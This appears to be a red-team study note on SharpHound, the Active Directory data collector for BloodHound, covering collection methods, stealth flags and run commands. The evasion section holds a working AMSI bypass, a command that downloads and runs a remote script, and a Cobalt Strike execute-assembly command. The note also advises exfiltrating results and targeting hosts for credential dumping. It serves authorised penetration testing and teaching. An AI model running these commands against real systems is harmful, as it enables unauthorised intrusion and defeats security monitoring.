---
tags: [tools, ad, pivoting, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.58 SharpHound Data Collection"
---

# SharpHound: Advanced Data Collection for BloodHound

SharpHound is the official C# data collector (ingestor) for BloodHound. It queries Active Directory to enumerate users, groups, computers, trusts, Group Policy Objects (GPOs), organizational units (OUs), and access control lists (ACLs). Additionally, it interacts with endpoints via SMB and RPC to determine local administrative rights and active user sessions.

The quality of a BloodHound graph is entirely dependent on the thoroughness and stealth of the SharpHound data collection phase.

## Architecture and Execution Model

SharpHound interacts heavily with the Domain Controller for LDAP queries and reaches out to every computer in the domain for session and local admin enumeration. This produces a massive amount of network traffic and requires careful tuning to avoid detection.

### ASCII Architecture Diagram

```text
+-------------------+
| Attacker / Pivot  |
|                   |
|   [SharpHound.exe]|
|          |        |
+----------+--------+
           |
           | 1. LDAP Queries (TCP 389/636)
           |    - Enumerate Users, Groups, Computers, ACLs
           v
+-------------------+
| Domain Controller |
+-------------------+
           ^
           |
           | 2. SMB/RPC Queries (TCP 445/135)
           |    - Enumerate Local Admins (SAMR)
           |    - Enumerate Sessions (NetWkstaUserEnum, NetSessionEnum)
           v
+-------------------+       +-------------------+       +-------------------+
| Workstation 1     |       | Workstation 2     |       | Member Server     |
+-------------------+       +-------------------+       +-------------------+
```

## Variants and Formats

SharpHound is distributed in multiple formats to suit various operational scenarios:
1.  **SharpHound.exe:** The compiled standalone executable. High risk of AV/EDR detection on disk.
2.  **SharpHound.ps1:** A PowerShell wrapper that reflectively loads the SharpHound assembly into memory. Useful for bypasses, though subject to AMSI.
3.  **BloodHound.py:** A Python port of SharpHound, ideal for executing from nonWindows systems (e.g., Kali Linux) over a proxychain.

## Core Collection Methods (`-c` / `--CollectionMethod`)

The Collection Method parameter determines what data SharpHound gathers.

-   **Default:** (Equivalent to `Group`, `LocalAdmin`, `Session`, `Trusts`). Good baseline.
-   **Group:** Enumerates group memberships. Very low noise.
-   **LocalAdmin:** Queries every computer via SAMR to determine local administrators. High noise.
-   **Session:** Queries computers to determine who is currently logged in. Critical for finding credential dumping targets, but extremely noisy and triggers EDR network monitors.
-   **Trusts:** Enumerates domain trusts.
-   **ACL:** Enumerates Access Control Lists on all objects. Slow and produces large files.
-   **ComputerOnly:** Only collects LocalAdmin and Session data.
-   **SessionLoop:** Continuously loops gathering session data. (Uses `--LoopDuration`).
-   **LoggedOn:** Identical to Session, but uses a different API call.
-   **All:** Collects everything. **Warning:** Highly likely to trigger SIEM alerts and takes a massive amount of time in large environments.

## Essential Command-Line Arguments

### Targeted Collection
- `-d`, `--Domain`: Specifies the target domain. (e.g., `corp.local`).
- `--DomainController`: Forces queries against a specific DC, bypassing DNS resolution. Useful over tunnels.
- `--SearchBase`: Restricts LDAP queries to a specific OU. (e.g., `OU=Users,DC=corp,DC=local`).

### Stealth and Evasion
- `--Stealth`: Performs stealthy session enumeration. Instead of querying every machine, it only queries the Domain Controllers. This finds far fewer sessions but generates significantly less network traffic.
- `--PortScanTimeout`: Modifies the timeout for computer reachability checks.
- `--Throttle`: Adds a delay (in milliseconds) between requests to computers.
- `--Jitter`: Adds a random percentage of jitter to the throttle.

### Output and Management
- `-f`, `--OutputDirectory`: Where to save the output zip.
- `--OutputPrefix`: Prepends a string to the zip file name.
- `--NoZip`: Leaves the output as raw JSON files instead of zipping them.
- `--ZipFileName`: Explicitly sets the output zip file name.

## Operational Execution Strategies

### Scenario 1: Baseline Stealth (LDAP Only)
When EDR is highly sensitive or network traffic must be minimized. This gathers AD structure, ACLs, and Group Memberships, but misses Session data and Local Admin data.

```powershell
.\SharpHound.exe -c DCOnly,ACL
```
*Note: This relies purely on LDAP queries to the DC, generating zero horizontal traffic to endpoints.*

### Scenario 2: Standard Aggressive Recon
The standard approach when noise is acceptable or EDR evasion is not a primary concern.

```powershell
.\SharpHound.exe -c Default -d corp.local --OutputPrefix corp_run1
```

### Scenario 3: Targeted Session Looping
Active Directory sessions are highly volatile. To catch an administrator logging into a machine, SharpHound can be run in a loop to build a historical session map over time.

```powershell
.\SharpHound.exe -c SessionLoop --LoopDuration 04:00:00 --LoopInterval 00:15:00
```
*(Runs for 4 hours, polling sessions every 15 minutes).*

### Scenario 4: Python Ingestion from Linux (BloodHound.py)
When operating from Kali Linux (often through a VPN or [[56 - proxychains SOCKS Proxy Chaining]]).

```bash
bloodhound-python -c All -u "attuser" -p "Password123!" -d corp.local -dc dc01.corp.local
```
If Kerberos authentication is required (e.g., NTLM is disabled):
```bash
export KRB5CCNAME=/path/to/ticket.ccache
bloodhound-python -c All -u "attuser" -p "" -d corp.local -dc dc01.corp.local -k
```

## Evasion and Bypassing AV/EDR

Executing `SharpHound.exe` natively on a compromised endpoint is a near-guaranteed way to alert Defender for Endpoint or CrowdStrike.

### 1. In-Memory Execution via PowerShell
Using AMSI bypasses combined with reflective loading.

```powershell
# 1. Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. Load SharpHound script
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-BloodHound.ps1')

# 3. Execute in memory
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
```

### 2. Assembly Reflection via Covenant / Cobalt Strike
Loading the SharpHound compiled binary dynamically using `execute-assembly`. This avoids dropping the binary to disk, though modern EDRs heavily monitor ETW (Event Tracing for Windows) and .NET introspection to catch `execute-assembly`.

```text
# Cobalt Strike beacon console
execute-assembly /path/to/local/SharpHound.exe -c All
```

### 3. BOF (Beacon Object File) Execution
Using a BOF implementation like `BofHound` or specialized LDAP BOFs significantly reduces the telemetry generated compared to loading .NET assemblies, evading .NET AMSI and ETW monitoring entirely.

## Parsing Output Files

SharpHound generates several `.json` files, which are then compressed into a single ZIP archive.

- `users.json`
- `computers.json`
- `groups.json`
- `gpos.json`
- `domains.json`
- `ous.json`

**Critical Step:** Exfiltrate this ZIP archive securely to the attacker machine to be imported into the [[57 - BloodHound Complete Usage and Query Reference]] GUI. Do not leave the ZIP file on the compromised host.

## Chaining Opportunities
- Take the output from SharpHound and import it into [[57 - BloodHound Complete Usage and Query Reference]] for visual path analysis.
- Use SharpHound's session output to target high-value systems for credential dumping with [[59 - Impacket All Scripts]] or Mimikatz.
- Route BloodHound-Python through [[56 - proxychains SOCKS Proxy Chaining]] when pivoting into internal subnets.

## Related Notes
- [[21 - Active Directory Enumeration]]
- [[38 - EDR Evasion and Bypass Strategies]]
- [[22 - Active Directory Lateral Movement]]
